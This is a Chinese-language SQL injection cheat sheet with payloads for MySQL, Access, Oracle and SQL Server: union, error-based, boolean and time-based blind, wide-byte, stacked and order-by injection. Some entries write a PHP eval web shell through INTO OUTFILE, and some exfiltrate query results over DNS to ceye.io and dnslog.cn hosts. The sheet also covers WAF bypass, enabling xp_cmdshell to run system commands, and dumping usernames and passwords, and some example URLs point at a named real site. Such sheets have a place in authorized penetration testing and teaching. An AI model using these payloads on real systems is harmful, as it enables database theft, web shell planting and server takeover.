<a name="cqY0y"></a>
# [https://github.com/AuFeng111/-/blob/master/sql.txt](https://github.com/AuFeng111/-/blob/master/sql.txt)
<a name="biaO7"></a>
# Sql注入判断数据库类型
![](https://cdn.nlark.com/yuque/0/2020/png/1345801/1587974214517-65ca5207-506a-449b-a66a-72ec0ecee15d.png#height=223&id=xoU9H&originHeight=293&originWidth=980&originalType=binary&ratio=1&status=done&style=none&width=746)
<a name="ulTMY"></a>
# Mysql注入
![](https://cdn.nlark.com/yuque/0/2020/png/1345801/1587974214662-b9b56057-653e-4884-8cc6-ddfb1c755456.png#height=226&id=Ct5Gz&originHeight=380&originWidth=1252&originalType=binary&ratio=1&status=done&style=none&width=746)<br />如果对应的表，列名爆不出来，可以尝试用字符转16进制转化。<br /> <br />相关函数：<br />system_user() 系统用户名<br />user() 用户名<br />current_user 当前用户名<br />session_user()连接数据库的用户名<br />database() 数据库名<br />version() MYSQL数据库版本<br />load_file() MYSQL读取本地文件的函数<br />@@datadir 读取数据库路径<br />@@basedir MYSQL 安装路径<br />@@version_compile_os 操作系统<br /> <br />多条数据显示函数：<br />concat()<br />group_concat()<br />concat_ws()
<a name="Bpjxn"></a>
# 正常的手工注入测试流程
id=1id=1'--+<br />测试注入点<br /><br />1 order by 2#<br />?id=2 union select 1,2,3 --+<br />1 union select 1,database()#<br /><br />1 union select 1,group_concat(table_name) from information_schema.tables where table_schema =database()#                        从所有的表里边找到这个库名里不重复的表名<br /><br /><br />1 union select1, group_concat(column_name) from information_schema.columns where table_name='表名' #               从所有的列名里边找到这个表名里不重复的列名<br />                                            <br /><br />user_id,first_name,last_name,user,password,avatar,last_login,failed_login。<br /><br />1 or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #

<a name="pCc20"></a>
## 常规注入
(Select schema _name from information_schema.schemata limit 0,1)<br /> <br />?id=-1’union select 1,2,(select group_concat(username,0x7e,password) from security.users) --+<br /> <br />?id=' union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database()) --+<br /> <br />?id=-1' union select 1,2, (select group_concat(column_name) from information_schema.columns where table_name='referers' ) --+<br /> <br />如果不能一次爆完全部，就使用limit，其中第一个数字0代表第一个表、列；1就是第二个<br />(select table_name from information_schema.tables where table_schema=database() limit 0,1)
<a name="pKlnM"></a>
## 报错语句
Group by concat floor，（这个语句不适合爆密码），floor()函数会影响md5值<br />and (select count(*) from information_schema.tables group by concat((select version()),floor(rand(0)*2)))--+<br /> <br />extractvalue<br />and extractvalue(1,concat(0x7e,(select user()),0x7e))--+<br /> <br />updatexml 常用<br />and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),1)--+<br /> <br />复杂语句报错注入 偶尔能用上<br />and (select 1 from (select count(*),concat('~',(select table_name from information_schema.tables where table_schema='hebjy1028' limit 0,1),'~',floor(rand(0)*2)) as a from information_schema.tables group by a)b)#
<a name="o9sWu"></a>
## 延时注入
思路是一样的（判断是否注入点→判断字符长度→内容逐个逐个爆破）<br />可以用python自动化脚本运行<br />[https://blog.csdn.net/weixin_41598660/article/details/105162513](https://blog.csdn.net/weixin_41598660/article/details/105162513)<br />也可以用burp去爆破<br />判断长度<br />/?id=1'and if(length(database())=8,sleep(10),1)--+<br /> <br />再判断字符（ascii判断）<br />?id=1" and if(ascii(substr(database(),1,1))>115,1,sleep(3))--+<br /> <br />（left语句判断）<br />?id=1' and if(left(database(),1)='s',sleep(10),1) --+<br />?id=1' and if(left(database(),2)='sa',sleep(10),1) --+<br /> <br />Substring函数判断<br />type=if(substring((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1='a'),11111,sleep(1))--+
<a name="LN7dw"></a>
## 布尔注入
Left判断<br />?id=1' and left(database(),1)='s' --+<br />?id=1' and left(database(),2) > 'sa' --+<br /> <br />Like语句判断<br />?id=1' and (select table_name from information_schema.tables where table_schema=database() limit 0,1)like 'e%'--+<br /> <br />Ascii语句判断<br />and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=115--+
<a name="2wJ40"></a>
## 宽字节注入
前提1 使用了addslashes()函数<br />        2 数据库设置了编码模式为GBK<br /> <br />原理：前端输入%df时，首先经过addslashes()转义变成%df%5c%27，之后，在数据库查询前，因为设置了GBK编码，GBK编码在汉字编码范围内的两个字节都会重新编码成一个汉字。然后mysql服务器会对查询的语句进行GBK编码，%df%5c编码成了“运“，而单引号逃逸了出来，形成了注入漏洞<br /> <br />%df' and 1=2 --+<br /> 
<a name="ArMuf"></a>
## 二次编码注入原理
![](https://cdn.nlark.com/yuque/0/2020/png/1345801/1587974214813-afa43573-6781-4704-acec-920f9959825c.png#height=419&id=BbnpZ&originHeight=506&originWidth=900&originalType=binary&ratio=1&status=done&style=none&width=746)<br />%25 urldecode（）编码变成%<br /> 
<a name="iXpt0"></a>
## 搜索框注入
实战经常碰到过<br />Sql数据库语句：SELECT*from sqltest where names like ‘%要查询的关键字%’<br />                          可构造payload                           欧锋%’ and 1=1 and ‘%1’=’%1<br />                                                                               欧锋%’ and 1=2 --+<br />                                                                                    欧锋%’ and 1=1 and ‘%
<a name="97i0u"></a>
## 堆叠注入
id=1;insert into users(id,username,password) values('100','new','new');<br />![](https://cdn.nlark.com/yuque/0/2020/png/1345801/1587974214978-96e44e5d-2a8f-4533-b34d-3b639156360e.png#height=327&id=Mjitu&originHeight=327&originWidth=241&originalType=binary&ratio=1&status=done&style=none&width=241)
<a name="D5MBD"></a>
## mysql写shell
1具备写入权限<br />2有物理路径<br />3GPC关闭（能使用单引号），magic_quotes_gpc=On
<a name="DfL5E"></a>
###  (2)不支持union 的话可以用 into outfile
语法：select * from admin where id=1 into outfile ‘F:\WWW\phpinfo.php’ fields terminated by ‘<? phpinfo(); ?>’%23<br /> <br />?id=1 union select 1,"<?php @eval($_POST['g']);?>",3 into outfile 'E:/study/WWW/evil.php'<br /> <br />一般实战需要把内容进行16进制加密写入<br />?id=1 union select 1,0x223c3f70687020406576616c28245f504f53545b2767275d293b3f3e22,3 into outfile "E:/study/WWW/evil.php"<br /> 
<a name="kOlH0"></a>
### (2)支持union的话可以用into dumpfile 函数
![](https://cdn.nlark.com/yuque/0/2020/png/1345801/1587974215114-b03a970b-3c50-4784-a9e6-e6bbfcaad732.png#height=33&id=uNFl4&originHeight=33&originWidth=566&originalType=binary&ratio=1&status=done&style=none&width=566)<br /> 
<a name="SuG1O"></a>
## DNSlog注入语句
内容无回显时可进行dnslog注入，用ceye.io注册、或者burpsuit自带的插件<br />?id=1' and if((select load_file(concat('\\\\',(select database()),'.hq87c4.ceye.io\\abc'))),1,0)--+<br /> <br />/?id=1' and if((select load_file(concat('\\\\',(select table_name from information_schema.tables where table_schema='security' limit 0,1),'. hq87c4.ceye.io\\abc'))),1,1)--+

SELECT LOAD_FILE(CONCAT('\\\\',(SELECT hex(user())),'.mysql.ip.port.ukg4ig.ceye.io\\abc'));<br /> <br /> 
<a name="nDNLR"></a>
## 奇葩注入方式
<a name="irhJt"></a>
### **(2)如果屏蔽了注释符**
用‘1‘ = ’1代替注释符即可绕过<br />php?page=4&cid=1' and 1=1 and '1'='1<br /> 
<a name="A340k"></a>
### **(2)**between注入
实战很罕见，但偶尔还真的能用得上<br />主要用于盲注看页面是否有变化，原理如下，例如username的字符内容是test1，第一个字符是t，a到b搜索不了，页面不正常。 a到t就有了，页面正常<br />![](https://cdn.nlark.com/yuque/0/2020/png/1345801/1587974215230-ccfbd2eb-502b-4495-b17b-0bbd2d7d2bef.png#height=228&id=oWjp5&originHeight=228&originWidth=692&originalType=binary&ratio=1&status=done&style=none&width=692)<br /> 
<a name="pxEpH"></a>
### **(2)**Limit注入
原理如下<br /> mysql> select id from users order by id desc limit 0,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);ERROR 1105 (HY000): XPATH syntax error: ':5.5.53'<br /> <br />![](https://cdn.nlark.com/yuque/0/2020/png/1345801/1587974215396-b51bef50-b1cb-43a5-9006-f9a73006916f.png#height=280&id=Abfrx&originHeight=280&originWidth=636&originalType=binary&ratio=1&status=done&style=none&width=636)<br /> <br />实战例子：<br />参数后and 1=2 判断，出现如红框所示and 1=2，1<br />![](https://cdn.nlark.com/yuque/0/2020/png/1345801/1587974215541-98cde5c9-f471-4dc4-93b9-80724558cb41.png#height=80&id=JeZlu&originHeight=130&originWidth=1210&originalType=binary&ratio=1&status=done&style=none&width=746)<br />构造payload<br /> index.php?start=0 procedure analyse(extractvalue(rand(),concat(0x3a,database())),2)--+<br />![](https://cdn.nlark.com/yuque/0/2020/png/1345801/1587974215792-9161edcf-69b1-4d1c-890b-ec576a30eee1.png#height=63&id=ZTPY6&originHeight=75&originWidth=890&originalType=binary&ratio=1&status=done&style=none&width=746)<br /> 
<a name="jMp1W"></a>
### **(2)**Orderby注入
当页面出现mysql报错信息时，注入点在 order by后面，此时可以利用报错信息进行注入。<br />原理如下图<br />![](https://cdn.nlark.com/yuque/0/2020/png/1345801/1587974215902-5f9e70ee-f0ad-4909-9c0f-0da72b6951fc.png#height=337&id=mpGG6&originHeight=337&originWidth=333&originalType=binary&ratio=1&status=done&style=none&width=333)<br />其中select * from users order by id desc;的desc是可控的传参值。<br />可构造payload： select * from users order by id and(updatexml(1,concat(0x7e,(select database())),0));<br />也可以接上 if(1=1,id,username);<br /> <br />乌云案例：<br />[https://www.uedbox.com/post/10853/](https://www.uedbox.com/post/10853/)<br /> <br />![](https://cdn.nlark.com/yuque/0/2020/png/1345801/1587974216049-14c824dd-2c01-4b94-b455-c1c844381eab.png#height=269&id=GlBsa&originHeight=411&originWidth=1139&originalType=binary&ratio=1&status=done&style=none&width=746)<br /> <br />[https://www.cnblogs.com/icez/p/Mysql-Order-By-Injection-Summary.html](https://www.cnblogs.com/icez/p/Mysql-Order-By-Injection-Summary.html)<br />[http://www.pptv.com/?t=ing&sort=join_cnt,if((4>3),1,(select](http://www.pptv.com/?t=ing&sort=join_cnt,if((4%3E3),1,(select) 1 from information_schema.tables)) <br />正常<br />[http://www.pptv.com/?t=ing&sort=join_cnt,if((4>5),1,(select](http://www.pptv.com/?t=ing&sort=join_cnt,if((4%3E5),1,(select) 1 from information_schema.tables))<br />不正常<br />[http://www.pptv.com/?t=ing&sort=join_cnt,if((ascii(mid(version(),1,1))>52),1,(select](http://www.pptv.com/?t=ing&sort=join_cnt,if((ascii(mid(version(),1,1))%3E52),1,(select) 1 from information_schema.tables))<br />正常<br />[http://www.pptv.com/?t=ing&sort=join_cnt,if((ascii(mid(version(),1,1))>53),1,(select](http://www.pptv.com/?t=ing&sort=join_cnt,if((ascii(mid(version(),1,1))%3E53),1,(select) 1 from information_schema.tables))<br />不正常数据库版本的第一个字符的ascii为53，为数字5<br />---------------------------------------------------<br />语句    order by 后id 直接注入，如下的sort接口后的id直接插payload<br /> (select 1 from(select 1 and if(ascii(substr((user()),1,1))=114,sleep(5),1))x)<br />![](https://cdn.nlark.com/yuque/0/2020/png/1345801/1587974216193-2b48afd9-996e-416b-9f8c-e053c10fffc3.png#height=396&id=kebYk&originHeight=517&originWidth=974&originalType=binary&ratio=1&status=done&style=none&width=746)
<a name="95AfO"></a>
## Mysql注入bypass
1.或者/**/代替空格 例如：**union**_/**/_select<br />2.等价替换：and -> &、%26   or -> ||<br />3.Mysql中可以利用的空白字符有：%09,%0a,%0b,%0c,%0d,%20,%a0<br />4.通过组合测试，可以发现 union%0a/!12345select/ 1,2 可以绕过防御。<br />5.Union/*something*/select  空格替换成垃圾字符干扰例如：/*asdw￥%*/<br />特殊函数替换干扰xx()替换为xx/*something*/()<br />6.尝试get改post<br />7.参数污染，如?id=1后再添加参加参数如  ?id=1&id=2<br /> <br />?id=1 /*!00000order/*!00000by/*!00000*/3<br />![](https://cdn.nlark.com/yuque/0/2020/png/1345801/1587974216307-975b41a2-fb87-4ea7-a782-6ebfb0a40ce0.png#height=236&id=ihnbO&originHeight=236&originWidth=491&originalType=binary&ratio=1&status=done&style=none&width=491)<br />Id=-1 or -1 and -1=-1<br />![](https://cdn.nlark.com/yuque/0/2020/png/1345801/1587974216450-5efbec17-22c5-467c-aa85-2d1695677df4.png#height=236&id=koSOE&originHeight=236&originWidth=392&originalType=binary&ratio=1&status=done&style=none&width=392)<br /> 

<a name="VLqwT"></a>
### **(2)**分块传输
原理：Chunk分块传输方法是一种有效的绕过WAF的Web攻击手段。其原理是利用`Transfer-Encoding: chunked`这个HTTP请求头，当HTTP请求中含有这个请求头时，则传输的数据全部可进行分块编码<br /> <br />Burp安装插件即可，<br />![](https://cdn.nlark.com/yuque/0/2020/png/1345801/1587974216595-9c6b6c31-867d-4bfa-aadf-36e1c77c78df.png#height=93&id=xv5mr&originHeight=93&originWidth=559&originalType=binary&ratio=1&status=done&style=none&width=559)<br />分块传输前的post传输<br />![](https://cdn.nlark.com/yuque/0/2020/png/1345801/1587974216712-99c3a2f9-ca68-4c1d-bb14-fd24b7644f2e.png#height=262&id=paWNE&originHeight=262&originWidth=495&originalType=binary&ratio=1&status=done&style=none&width=495)<br />分块传输后格式<br />![](https://cdn.nlark.com/yuque/0/2020/png/1345801/1587974216908-469389a7-fcaf-4145-83b6-2590f7d65d3c.png#height=366&id=vbUlO&originHeight=505&originWidth=1030&originalType=binary&ratio=1&status=done&style=none&width=746)<br /> <br /> <br /> 
<a name="zoa46"></a>
# Access数据库注入
![](https://cdn.nlark.com/yuque/0/2020/png/1345801/1587974217198-f71b2f3c-7191-42aa-b8db-e6b07b79f03a.png#height=120&id=xIGgw&originHeight=172&originWidth=1069&originalType=binary&ratio=1&status=done&style=none&width=746)<br />Access数据库中没有注释符号.因此  /**/   、 --   和   #   都没法使用。<br /> <br />参数后面加  ’ 、and 1=1、and 1=2看返回状态判断是否存在注入点 <br />Access数据库特有的表是：**msysobjects  **，所以可以用它来判断是否是Access数据库<br />参数后面加 and exists(select*from admin) 猜表名  返回正常页面表示存在(admin)<br />Order by探测字段，有3行<br /> 
<a name="5ATyM"></a>
## 有回显：
union select 1,2,3 from admin（此时页面有显示2、3）<br />查列：and exists (select 列名 from 表名) （假设存在user、password）<br />union select 1,user,password from admin（即可爆出账号密码）<br /> 
<a name="TfjUv"></a>
## 无回显：
查表：and exists (select * from 表名) 存在的话就返回正常 不存在就返回不正常<br />查列：and exists (select 列名 from 表名)<br />查内容：and (select top 1 asc(mid(user,1,1))from admin)=97<br /> and (select top 1 asc(mid(user,2,1))from admin)=97 猜字段(username)中第一条记录内容的第二个字符<br /> and (select top 2 asc(mid(user,1,1))from admin)=97 猜字段(username)中第二条记录内容的第一个字符<br /> 
<a name="uzoDM"></a>
## 偏移注入（回显数连续）
假设已经判断存在admin表，order by下判断有35行，且回显如下回显字段连续<br />![](https://cdn.nlark.com/yuque/0/2020/png/1345801/1587974217351-a5c518a9-5958-4a17-9cd0-ece28d55052c.png#height=102&id=pyPjZ&originHeight=102&originWidth=600&originalType=binary&ratio=1&status=done&style=none&width=600)<br /> <br />UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,* from admin --返回错误页面<br /> <br />UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,* from admin --返回错误页面<br /> <br />UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,* from admin --返回错误页面<br /> <br />UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,* from admin --返回到一个错误页面提示查询语句出错，因此admin表的列数为6<br /> <br />UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,admin.*,34,35 from admin<br />因为回显如下图 28 29 30是连着的，直接在27后加表名.*<br />![](https://cdn.nlark.com/yuque/0/2020/png/1345801/1587974217351-a5c518a9-5958-4a17-9cd0-ece28d55052c.png#height=102&id=Q7HIu&originHeight=102&originWidth=600&originalType=binary&ratio=1&status=done&style=none&width=600)<br />爆出内容<br />![](https://cdn.nlark.com/yuque/0/2020/png/1345801/1587974217481-85ed1ca4-5942-45b1-85e0-a658ad7e4ab5.png#height=127&id=ZUUPq&originHeight=127&originWidth=640&originalType=binary&ratio=1&status=done&style=none&width=640)<br />UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,admin.*,34,35 from admin where id = 3 添加where id =数值，可得到更多的内容<br /> 
<a name="O3gCV"></a>
## 偏移注入（常规操作）
Access偏移注入：表名知道，列名无法获取的情况下。<br />存在注入点，且order by下判断出字段数为22行<br />**爆出显位**<br />127.0.0.1/asp/index.asp?id=1513 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22 from admin<br />***号判断直到页面错误有变化**<br />127.0.0.1/asp/index.asp?id=1513 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,* from admin 正确<br />说明admin有6个字段<br />**Access偏移注入**，基本公式为：<br />order by 出的字段数减去*号的字段数，然而再用order by的字段数减去2倍刚才得出来的答案；<br />也就是：<br />* = 6个字符<br />2 × * = 12个字符<br />22 - 12 = 10个字符<br /> <br />一级偏移语句：<br />127.0.0.1/asp/index.asp?id=1513 union select 1,2,3,4,5,6,7,8,9,10,* from (admin as a inner join admin as b on a.id = b.id)<br />二级偏移语句：<br />127.0.0.1/asp/index.asp?id=1513 union select 1,2,3,4,a.id,b.id,c.id,* from ((admin as a inner join admin as b on a.id = b.id)inner join admin as c on a.id=c.id)<br /> <br />实战常见的表和列（也可以用sqlmap的，但是量大且效率低）<br />常见的表有（最后根据企业名的缩写搭配上admin、user、name）<br />admin admins admin_user admin_usr admin_msg admin_login user username manager msg_user msg_login useradmin  product、news、usr、system、article、customer、area<br />admin_id、admin_name、admin_password<br /> <br />常见的列<br />admin admin_user username password passwd pass pwd users usr user_login user_name login_name name等等<br /> <br /> 
<a name="xCCKW"></a>
# oracle注入
![](https://cdn.nlark.com/yuque/0/2020/png/1345801/1587974217593-992dec97-d425-4dd5-baf1-70d044944137.png#height=512&id=LSpo7&originHeight=546&originWidth=795&originalType=binary&ratio=1&status=done&style=none&width=746)<br /> 

<a name="L3rKe"></a>
## 常规有回显注入
order by 3--<br />and 1=2 union select null,null,null from dual--<br />and 1=2 union select 'null',null,null from dual--  //返回正常，则第一个字段是数字型，返回错误，为字符型<br />and 1=2 union select 1,'2','3' from dual--  //判断显示位<br />and 1=2 union select null,(select banner from sys.v_$version where rownum=1),null from dual--  //探测数据库版本信息<br />and 1=2 union select null,(select table_name from user_tables where rownum=1),null from dual--  //查询第一个表名<br />and 1=2 union select null,(select table_name from user_tables where rownum=1 and table_name<>'STUDENT'),null from dual--  //第二个表名

获取关键表中的列名：<br />' union select null,(select column_name from user_tab_columns where table_name='T_USER' and rownum=1),null from dual --

' union select null,(select column_name from user_tab_columns where table_name='T_USER'  and column_name<>'SUSER' and rownum=1),null from dual --

' union select null,(select column_name from user_tab_columns where table_name='T_USER'  and column_name<>'SUSER' and column_name<>'SPWD' and rownum=1),null from dual --

' union select null,(select column_name from user_tab_columns where table_name='T_USER'  and column_name<>'SUSER' and column_name<>'SPWD'  and column_name<>'SNAME' and rownum=1),null from dual --

and 1=2  union select SNAME,SUSER,SPWD from T_USER where id=1--  //查看数据<br /> 
<a name="ypE7H"></a>
## 第二种常规注入
确定回显位，假设当前共2个字段，全是数字型，判断方式如下：<br />　　and 1=2 union select 1,2 from dual　　假设回显位是2，爆当前数据库中的第一个表：<br />　　and 1=2 union select 1,(select table_name from user_tables where rownum=1) from dual　　爆当前数据库中的第二个表：<br />　　and 1=2 union select 1,(select table_name from user_tables where rownum=1 and table_name not in ('第一个表')) from dual　　以此类推去爆第n个表<br />　　爆某表中的第一个字段：<br />　　and 1=2 union select 1,(select column_name from user_tab_columns where rownum=1 and table_name='表名（大写的）') from dual　　爆某表中的第二个字段：<br />　　and 1=2 union select 1,(select column_name from user_tab_columns where rownum=1 and table_name='表名' and column_name not in ('第一个字段')) from dual　　爆其它字段以此类推<br />　　爆某表中的第一行数据：<br />　　and 1=2 union select 1,字段1||字段2...||字段n from 表名 where rownum=1 --连接多个字段用到的连接符号是||,在oracle数据库中，concat函数只能连接两个字符串<br /> 
<a name="HFwys"></a>
## 报错注入
利用 utl_inaddr.get_host_name<br />这种方法在Oracle 8g，9g，10g中不需要任何权限，但是在Oracle 11g以及以后的版本中，当前数据库用户必须有网络访问权限。

jsp?name=' and 1=utl_inaddr.get_host_name((select user from dual)) --<br /> <br />ctxsys.drithsx.sn()<br />jsp?name=' and 1=ctxsys.drithsx.sn(1,(select user from dual)) --<br /> <br />dbms_xdb_version.checkin()<br />jsp?name=1' and (select dbms_xdb_version.checkin((select user from dual)) from dual) is not null—<br /> <br />dbms_utility.sqlid_to_sqlhash()<br />jsp?name=1' and (SELECT dbms_utility.sqlid_to_sqlhash((select user from dual)) from dual) is not null --<br /> <br />XMLType()<br />sname=1′ and (select upper(XMLType(chr(60)||chr(58)||(select user from dual)||chr(62))) from dual) is not null --<br /> 
<a name="5Te3E"></a>
## 布尔注入
`jsp?id=1 and 1=(select decode(substr(user,1,1),'S',1,0) from dual) --`<br />![](https://cdn.nlark.com/yuque/0/2020/png/1345801/1587974217730-b7fe52ce-dfe4-44e5-b0b0-d009908ec170.png#height=218&id=Buh4V&originHeight=218&originWidth=429&originalType=binary&ratio=1&status=done&style=none&width=429)<br />username=admin' and (select substr(user, 1, 1) from dual)='S' --<br /> 
<a name="38CkX"></a>
## 时间盲注
主要用DBMS_PIPE.RECEIVE_MESSAGE<br />即user的第一位是"A"时，延时5秒执行。<br />And 1=(select decode(substr(user,1,1),'A',DBMS_PIPE.RECEIVE_MESSAGE('a',5) ,0) from dual)<br />第二位是D时，延时5秒<br />And 1=(select decode(substr(user,2,1),'D',DBMS_PIPE.RECEIVE_MESSAGE('a',5) ,0) from dual)<br /> <br />news.jsp?id=1 and 1=(select decode(substr(user,1,1),'S',dbms_pipe.receive_message('RDS',5),0) from dual) –

<a name="OOMlk"></a>
## DNSlog注入
utl_inaddr.get_host_address<br />select utl_inaddr.get_host_address((select user from dual)||'.cbb1ya.dnslog.cn') from dual<br /> <br /> <br />SYS.DBMS_LDAP.INIT 这个函数在 10g/11g 中是 public 权限.<br />SELECT DBMS_LDAP.INIT((select user from dual)||'.24wypw.dnslog.cn',80) FROM DUAL;<br /> <br />其他攻击思路（见思维导图）<br />还未研究插个眼<br /> 
<a name="fL0hA"></a>
# Sqlserver注入
支持的注释符  /*   --  ;%00<br />Mssql可以利用的空白字符有：<br />01,02,03,04,05,06,07,08,09,0A,0B,0C,0D,0E,0F,10,11,12,13,14,15,16,17,18,19,1A,1B,1C,1D,1E,1F,20<br /> <br />@@version // 数据库版本<br />user  //获取当前数据库用户名<br />db_name() // 当前数据库名 其中db_name(N)可以来遍历其他数据库<br />;select user //查询是否支持多语句<br /> <br />报错显示Microsoft OLE DB Provider for ODBC Drivers 错误<br /> 

- SA权限：数据库操作、文件管理、命令执行、注册表读取
- DB权限：数据库操作、文件管理
- Public权限：数据库操作
<a name="iFCli"></a>
## 普通注入：
order by 2 成功；order by 3 失败； order by 4 成功；order by 5 失败 说明列数位于 3-4之间。查找回显点<br />![](https://cdn.nlark.com/yuque/0/2020/png/1345801/1587974217880-8cfcb6ba-04c1-4055-aff6-7473b639bbea.png#height=365&id=VetCk&originHeight=455&originWidth=931&originalType=binary&ratio=1&status=done&style=none&width=746)<br /> <br />id=2 and 1=2 union all select null,null,null,null；挨个替换null 发现 select null,2,null,null             页面出现回显。<br />![](https://cdn.nlark.com/yuque/0/2020/png/1345801/1587974218062-40b56495-6082-42eb-8d96-05ab1916256e.png#height=364&id=KEWnm&originHeight=454&originWidth=931&originalType=binary&ratio=1&status=done&style=none&width=746)<br />查找所在库名称添加： ?id=2 and 1=2 union all select 1,(select db_name()), '3', 4<br />找到数据库名称。 提示：这里也可以使用db_name(1)、db_name(2)等查询其他数据<br />![](https://cdn.nlark.com/yuque/0/2020/png/1345801/1587974218292-f214c93a-bff9-414a-944f-94af15316bac.png#height=380&id=VPUAC&originHeight=474&originWidth=931&originalType=binary&ratio=1&status=done&style=none&width=746)<br />查找数据库表名称：?id=2 and 1=2 union all select 1,(select top 1 name from mozhe_db_v2.dbo.sysobjects where xtype = 'U'),'3',4提示: xtype='U' 为 用户表<br />![](https://cdn.nlark.com/yuque/0/2020/png/1345801/1587974218514-9b171351-fbcb-45ed-8121-3e0dd0546abf.png#height=346&id=YBLDD&originHeight=432&originWidth=931&originalType=binary&ratio=1&status=done&style=none&width=746)<br />?id=2 and 1=2 union all select 1,(select top 1 col_name(object_id('manage'),1) from sysobjects),'3',4替换 col_name(object_id('manage'),1) 中的1 依次为 2，3，4查出所有列名。<br />![](https://cdn.nlark.com/yuque/0/2020/png/1345801/1587974218655-78fa1b08-8931-4ca4-9587-efe698dbc140.png#height=213&id=lsk1o&originHeight=477&originWidth=931&originalType=binary&ratio=1&status=done&style=none&width=415)<br /> <br />查取数据: ?id=2 and 1=2 union all select 1,(select top 1 username from manage),'3',4       获取用户名；<br />?id=2 and 1=2 union all select 1,(select top 1 password from manage),'3',4         获取密码<br /> 
<a name="BdArP"></a>
## 全回显操作
获取当前数据库中的表（有2个语句可供选择使用）【下列语句可一次爆数据库所有表（只限于mssql2005及以上版本）】<br />     (select quotename(name) from 数据库名..sysobjects where xtype='U' FOR XML PATH(''))--<br />(select '|'%2bname%2b'|' from 数据库名..sysobjects where xtype='U' FOR XML PATH(''))--<br />案例： mozhe_dbv2是数据库名字<br />![](https://cdn.nlark.com/yuque/0/2020/png/1345801/1587974218772-f74a042b-0741-4d74-84f4-d8a6816f6ebf.png#height=269&id=uj9Kd&originHeight=434&originWidth=1203&originalType=binary&ratio=1&status=done&style=none&width=746)<br /> <br />一次爆指定表的所有列（只限于mssql2005及以上版本）：    <br />(select quotename(name) from 数据库名..syscolumns where id =(select id from 数据库名..sysobjects where name='指定表名') FOR XML PATH(''))-- <br />(select '|'%2bname%2b'|' from 数据库名..syscolumns where id =(select id from 数据库名..sysobjects where name='指定表名') FOR XML PATH(''))—<br /> <br />案例： mange是表名<br />![](https://cdn.nlark.com/yuque/0/2020/png/1345801/1587974218902-89f7bb44-e2ff-4ac5-beac-1c04789b42b1.png#height=282&id=wRFGP&originHeight=471&originWidth=1248&originalType=binary&ratio=1&status=done&style=none&width=746)<br /> 
<a name="FCQ3y"></a>
## 报错注入
and 1=(select @@VERSION) //**MSSQL**版本<br />And 1=(select db_name()) //当前数据库名<br />and 1=(select @@servername) //本地服务名<br />and 1=(select IS_SRVROLEMEMBER('sysadmin')) //判断是否是系统管理员sa<br />常用权限：sysadmin、serveradmin、setupadmin、securityadmin、diskadmin、bulkadmin<br />and 1=(Select IS_MEMBER('db_owner')) //判断是否是库权限dbo<br />and 1= (Select HAS_DBACCESS('master')) //判断是否有库读取权限
<a name="oY95o"></a>
### (2)单个爆破：
and 1=convert(int,(select top 1 table_name from information_schema.tables ))—获取第一个表名<br />and 1=convert(int,(select top 1 table_name from information_schema.tables where table_name not in('photoGalary') )) 获取第二个表名<br />and 1=convert(int,(select top 1 column_name from information_schema.columns where table_name='login' ))— 获取第一个列名<br />and 1=convert(int,(select top 1 username from login ))<br />and 1=convert(int,(select top 1 password from login ))
<a name="E4xFa"></a>
### (2)全爆语句
       爆表，要求sqlserver版本2005以上<br />and 1=(select quotename(name) from 数据库名..sysobjects where xtype='U' FOR XML PATH(''))-- <br />    and 1=(select '|'%2bname%2b'|' from 数据库名..sysobjects where xtype='U' FOR XML PATH(''))--<br /> <br />爆列<br />and 1=(select quotename(name) from 数据库名..syscolumns where id =(select id from 数据库名..sysobjects where name='指定表名') FOR XML PATH(''))-- <br />    and 1=(select '|'%2bname%2b'|' from 数据库名..syscolumns where id =(select id from 数据库名..sysobjects where name='指定表名') FOR XML PATH(''))—<br /> 
<a name="Ad6p5"></a>
## 时间注入
aspx?id=1;if (select IS_SRVROLEMEMBER('sysadmin'))=1 WAITFOR DELAY '0:0:5' –<br />如果是sa权限，就延时。<br />案例：<br />![](https://cdn.nlark.com/yuque/0/2020/png/1345801/1587974219011-ce667f1b-92c4-496b-b3a3-34ff490c81ea.png#height=473&id=Q20bx&originHeight=598&originWidth=944&originalType=binary&ratio=1&status=done&style=none&width=746)<br /> <br />判断内容<br />aspx?id=1;if (ascii(substring((select top 1 name from master.dbo.sysdatabases),1,1)))>1 WAITFOR DELAY '0:0:5'--<br /> <br /> 
<a name="bf6ER"></a>
## 布尔盲注
1.aspx?id=1 and ascii(substring((select top 1 name from master.dbo.sysdatabases),1,1)) >= 109
<a name="ZTxU9"></a>
## XP_CMDSHELL检测
看下目标的xp_cmdshell存储过程是否还在,主要是想看它有没有被删掉,你也可以用这种方式来查询其它你想知道的任何存储过程，如果判断还在，页面显示正常，不在的话页面报错。<br /> <br />and 1=(select count(*) from master..sysobjects where xtype = 'x' and name = 'xp_cmdshell') –<br /> <br />开启xpcmdshell一句话。前提 1、支持堆叠  2、扩展存储过程没被删除<br />EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;


前提：sa权限探测是否存在1433端口。然后检测是否开启CMDSHELL<br />用XP_CMDSHELL添加用户hacker：<br />exec master..xp_cmdshell "whoami" 

